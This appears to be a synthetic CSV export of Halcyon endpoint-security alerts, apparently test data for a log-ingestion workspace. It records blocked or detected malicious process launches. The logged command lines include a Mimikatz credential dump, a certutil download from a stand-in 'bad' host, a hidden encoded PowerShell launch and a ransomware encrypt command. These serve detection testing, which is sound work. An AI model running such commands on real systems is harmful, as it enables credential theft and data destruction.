TimeGenerated [UTC],time,activity_id,activity_name,category_uid,category_name,class_uid,class_name,type_uid,type_name,severity_id,severity,message,raw_data,raw_record,status_id,status,action_id,action,disposition_id,disposition,rcode,rcode_id,metadata,unmapped,actor,device,file,process,user,dst_endpoint,src_endpoint,traffic,query,answers,driver,module,app,HalcyonEventId,HalcyonSourceTime,TenantId,Type,_ResourceId
2026-07-22T08:00:00Z,1784707200000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: evil.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000001""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000001""}","{""process"": {""pid"": 6601, ""cmd_line"": ""\""C:\\Windows\\explorer.exe\"""", ""file"": {""name"": ""explorer.exe"", ""path"": ""C:\\Windows\\explorer.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003e9""}]}, ""parent_process"": {""pid"": 701}}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0001.corp.local"", ""uid"": ""dev-0001""}",,"{""pid"": 6601, ""file"": {""name"": ""evil.exe"", ""path"": ""C:\\Temp\\evil.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000001""}]}, ""cmd_line"": ""evil.exe -runkey HKCU""}",,,,,,,,,,e2000000-0000-0000-0000-000000000001,2026-07-22T08:00:00Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:14:07Z,1784708047000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon detected process: dropper.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000002""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000002""}","{""process"": {""pid"": 6602, ""cmd_line"": ""cmd /c dropper.exe"", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003ea""}]}, ""parent_process"": {""pid"": 702}}, ""user"": {""name"": ""CORP\\analyst"", ""uid"": ""S-1-5-21-1002""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0002.corp.local"", ""uid"": ""dev-0002""}",,"{""pid"": 6602, ""file"": {""name"": ""dropper.exe"", ""path"": ""C:\\Users\\Public\\dropper.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000002""}]}, ""cmd_line"": ""dropper.exe /silent /install""}",,,,,,,,,,e2000000-0000-0000-0000-000000000002,2026-07-22T08:14:07Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:28:14Z,1784708894000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: powershell.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000003""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000003""}","{""process"": {""pid"": 6603, ""cmd_line"": ""cmd /c powershell ..."", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003eb""}]}, ""parent_process"": {""pid"": 703}}, ""user"": {""name"": ""CORP\\svc-admin"", ""uid"": ""S-1-5-21-1003""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0003.corp.local"", ""uid"": ""dev-0003""}",,"{""pid"": 6603, ""file"": {""name"": ""powershell.exe"", ""path"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000003""}]}, ""cmd_line"": ""powershell -nop -w hidden -enc SQBFAFgA""}",,,,,,,,,,e2000000-0000-0000-0000-000000000003,2026-07-22T08:28:14Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:42:21Z,1784709741000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon blocked process: wscript.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000004""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000004""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0004.corp.local"", ""uid"": ""dev-0004""}",,"{""pid"": 6604, ""file"": {""name"": ""wscript.exe"", ""path"": ""C:\\Windows\\System32\\wscript.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000004""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000004,2026-07-22T08:42:21Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T08:56:28Z,1784710588000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: mimikatz.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000005""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000005""}","{""process"": {""pid"": 6605, ""cmd_line"": ""powershell -c ./mimi"", ""file"": {""name"": ""powershell.exe"", ""path"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003ed""}]}, ""parent_process"": {""pid"": 705}}, ""user"": {""name"": ""CORP\\administrator"", ""uid"": ""S-1-5-21-1004""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0005.corp.local"", ""uid"": ""dev-0005""}",,"{""pid"": 6605, ""file"": {""name"": ""mimikatz.exe"", ""path"": ""C:\\Temp\\mimikatz.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000005""}]}, ""cmd_line"": ""mimikatz.exe sekurlsa::logonpasswords""}",,,,,,,,,,e2000000-0000-0000-0000-000000000005,2026-07-22T08:56:28Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:10:35Z,1784711435000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,3,Medium,Halcyon detected process: rundll32.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000006""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000006""}","{""process"": {""pid"": 6606, ""cmd_line"": ""services.exe"", ""file"": {""name"": ""services.exe"", ""path"": ""C:\\Windows\\System32\\services.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003ee""}]}, ""parent_process"": {""pid"": 706}}, ""user"": {""name"": ""CORP\\analyst"", ""uid"": ""S-1-5-21-1002""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""WKSTN-06"", ""uid"": ""dev-0006""}",,"{""pid"": 6606, ""file"": {""name"": ""rundll32.exe"", ""path"": ""C:\\Windows\\System32\\rundll32.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000006""}]}, ""cmd_line"": ""rundll32.exe evil.dll,Start""}",,,,,,,,,,e2000000-0000-0000-0000-000000000006,2026-07-22T09:10:35Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:24:42Z,1784712282000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon blocked process: regsvr32.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000007""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000007""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\jdoe"", ""uid"": ""S-1-5-21-1001""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0007.corp.local"", ""uid"": ""dev-0007""}",,"{""pid"": 6607, ""file"": {""name"": ""regsvr32.exe"", ""path"": ""C:\\Windows\\System32\\regsvr32.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000007""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000007,2026-07-22T09:24:42Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:38:49Z,1784713129000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: ransom.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000008""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000008""}","{""process"": {""pid"": 6608, ""cmd_line"": ""cmd /c ransom.exe"", ""file"": {""name"": ""cmd.exe"", ""path"": ""C:\\Windows\\System32\\cmd.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f0""}]}, ""parent_process"": {""pid"": 708}}, ""user"": {""name"": ""CORP\\svc-admin"", ""uid"": ""S-1-5-21-1003""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0008.corp.local"", ""uid"": ""dev-0008""}",,"{""pid"": 6608, ""file"": {""name"": ""ransom.exe"", ""path"": ""C:\\ProgramData\\ransom.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000008""}]}, ""cmd_line"": ""ransom.exe --encrypt --path C:\\""}",,,,,,,,,,e2000000-0000-0000-0000-000000000008,2026-07-22T09:38:49Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T09:52:56Z,1784713976000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,5,Critical,Halcyon blocked process: cobaltstrike.exe,,,1,Success,2,Denied,2,Blocked,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000009""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""MaliciousExecutable"", ""halcyon_alert_id"": ""alert-000009""}","{""process"": {""pid"": -1}, ""user"": {""name"": ""CORP\\analyst"", ""uid"": ""S-1-5-21-1002""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0009.corp.local"", ""uid"": ""dev-0009""}",,"{""pid"": 6609, ""file"": {""name"": ""cobaltstrike.exe"", ""path"": ""C:\\Temp\\cobaltstrike.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""0000000000000000000000000000000000000000000000000000000000000009""}]}}",,,,,,,,,,e2000000-0000-0000-0000-000000000009,2026-07-22T09:52:56Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
2026-07-22T10:06:03Z,1784714763000,1,Launch,1,System Activity,1007,Process Activity,100701,Process Activity: Launch,4,High,Halcyon detected process: certutil.exe,,,1,Success,1,Allowed,15,Detected,,,"{""product"": {""name"": ""Halcyon"", ""vendor_name"": ""Halcyon""}, ""version"": ""1.8.0"", ""profiles"": [""host"", ""security_control""], ""original_event_uid"": ""e2000000-0000-0000-0000-000000000010""}","{""halcyon_tenant_id"": ""tenant-7f3a"", ""halcyon_event_kind"": ""NefariousCmdLine"", ""halcyon_alert_id"": ""alert-000010""}","{""process"": {""pid"": 6610, ""cmd_line"": ""powershell -c certutil"", ""file"": {""name"": ""powershell.exe"", ""path"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"", ""type_id"": 8, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""00000000000000000000000000000000000000000000000000000000000003f2""}]}, ""parent_process"": {""pid"": 710}}, ""user"": {""name"": ""CORP\\administrator"", ""uid"": ""S-1-5-21-1004""}}","{""type"": ""Unknown"", ""type_id"": 0, ""hostname"": ""host-0010.corp.local"", ""uid"": ""dev-0010""}",,"{""pid"": 6610, ""file"": {""name"": ""certutil.exe"", ""path"": ""C:\\Windows\\System32\\certutil.exe"", ""type_id"": 0, ""hashes"": [{""algorithm_id"": 3, ""algorithm"": ""SHA-256"", ""value"": ""000000000000000000000000000000000000000000000000000000000000000a""}]}, ""cmd_line"": ""certutil -urlcache -f http://bad/x.exe""}",,,,,,,,,,e2000000-0000-0000-0000-000000000010,2026-07-22T10:06:03Z,1a0e2567-2e58-4989-ad18-206108185325,HalcyonEventsV2_CL,/subscriptions/00000000-0000-0000-0000-000000000000/resourcegroups/halcyon-rg/providers/microsoft.operationalinsights/workspaces/halcyon-ws
